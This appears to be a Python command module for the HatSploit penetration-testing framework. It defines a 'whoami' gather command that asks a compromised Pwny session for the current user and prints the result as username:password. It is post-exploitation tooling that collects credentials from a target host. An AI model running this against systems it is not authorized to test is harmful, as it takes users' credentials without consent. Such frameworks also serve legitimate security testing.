"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwny.types import *

from hatsploit.lib.command import Command


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "gather",
            'Name': "whoami",
            'Authors': [
                'Ivan Nikolsky (enty8080) - command developer'
            ],
            'Description': "Get current username and password.",
            'Usage': "whoami",
            'MinArgs': 0
        }

    def run(self, argc, argv):
        result = self.session.send_command(
            tag=BUILTIN_WHOAMI,
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to get current user!")
            return

        password = result.get_string(TLV_TYPE_STRING)
        username = result.get_string(TLV_TYPE_STRING)

        self.print_empty(username + ':' + password)
